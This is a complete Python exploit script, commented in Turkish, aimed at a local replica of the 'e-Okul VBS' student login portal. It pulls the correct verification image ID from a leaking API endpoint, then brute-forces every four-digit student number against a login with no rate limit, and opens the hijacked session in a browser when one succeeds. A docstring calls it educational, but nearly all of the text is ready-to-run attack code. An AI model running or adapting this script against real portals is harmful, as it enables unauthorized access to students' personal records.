"""
e-Okul VBS Brute-Force Exploit Script
======================================
Bu script, iki zafiyeti zincirleme (chain) kullanır:
  1. Information Disclosure: /api/verification-data endpoint'inden
     doğru resim ID'sini alır (sunucu cevabı sızdırır).
  2. Brute-Force: /login endpoint'inde rate limiting olmamasından
     faydalanarak 0001-9999 arası tüm öğrenci numaralarını dener.

UYARI: Bu script yalnızca eğitim amaçlıdır.
Gerçek sistemlerde bu tür saldırılar yasa dışıdır.
"""

import requests
import time
import webbrowser

# ============================================================
# Hedef sunucu ayarları
# ============================================================
BASE_URL = "http://localhost:3000"
LOGIN_URL = f"{BASE_URL}/login"
VERIFICATION_URL = f"{BASE_URL}/api/verification-data"

# Sabit tutulan değerler (saldırgan bunları bildiğini varsayıyor)
CITY = "ANKARA"

# Brute-force aralığı
START = 1
END = 9999

def get_correct_image_id():
    """
    Information Disclosure zafiyetini kullanarak doğru resim ID'sini al.
    Sunucu, /api/verification-data endpoint'inde doğru cevabı açıkça gönderiyor.
    """
    try:
        response = requests.get(VERIFICATION_URL)
        data = response.json()
        correct_id = str(data.get("correctImageId"))
        return correct_id
    except Exception as e:
        print(f"  [!] Doğrulama verisi alınamadı: {e}")
        return None

def brute_force():
    print("=" * 60)
    print("  e-Okul VBS Brute-Force Saldırısı Başlatılıyor...")
    print("=" * 60)
    print(f"  Hedef      : {LOGIN_URL}")
    print(f"  Şehir      : {CITY}")

    # Önce Information Disclosure zafiyetini kullanarak doğru resim ID'sini al
    print()
    print("  [*] Information Disclosure zafiyeti kullanılıyor...")
    correct_image_id = get_correct_image_id()
    if not correct_image_id:
        print("  [!] Doğru resim ID'si alınamadı, çıkılıyor.")
        return
    print(f"  [+] Doğru resim ID'si sızdırıldı: {correct_image_id}")

    print(f"  Aralık     : {START:04d} - {END:04d}")
    print("=" * 60)
    print()

    start_time = time.time()
    attempted = 0

    for number in range(START, END + 1):
        student_no = f"{number:04d}"  # 0001, 0002, ..., 9999
        attempted += 1

        # Her 500 denemede bir ilerleme göster
        if attempted % 500 == 0:
            elapsed = time.time() - start_time
            rate = attempted / elapsed if elapsed > 0 else 0
            print(f"  [*] Deneniyor: {student_no}  |  {attempted}/{END} deneme  |  {rate:.0f} istek/sn")

        payload = {
            "city": CITY,
            "studentNo": student_no,
            "selectedImageId": correct_image_id
        }

        try:
            response = requests.post(LOGIN_URL, json=payload)
            data = response.json()

            if data.get("success"):
                elapsed = time.time() - start_time
                print()
                print("!" * 60)
                print(f"  [+] BASARILI GIRIS BULUNDU!")
                print(f"  [+] Ogrenci Numarasi : {student_no}")
                print(f"  [+] Sehir            : {CITY}")
                print(f"  [+] Resim ID         : {correct_image_id}")
                print(f"  [+] Redirect URL     : {data.get('redirectUrl')}")
                print(f"  [+] Sunucu Yaniti    : {data.get('message')}")
                print(f"  [+] Toplam Deneme    : {attempted}")
                print(f"  [+] Gecen Sure       : {elapsed:.2f} saniye")
                print("!" * 60)
                # Otomatik olarak tarayıcıda aç
                redirect_url = f"{BASE_URL}{data.get('redirectUrl')}"
                print(f"\n  [*] Tarayıcı açılıyor: {redirect_url}")
                webbrowser.open(redirect_url)
                return

        except requests.exceptions.ConnectionError:
            print(f"  [!] Sunucuya bağlanılamıyor! Sunucunun çalıştığından emin olun.")
            return
        except Exception as e:
            print(f"  [!] Hata: {e}")
            continue

    elapsed = time.time() - start_time
    print()
    print("-" * 60)
    print(f"  [-] Gecerli numara bulunamadi.")
    print(f"  [-] Toplam {attempted} deneme yapildi ({elapsed:.2f} saniye)")
    print("-" * 60)


if __name__ == "__main__":
    brute_force()
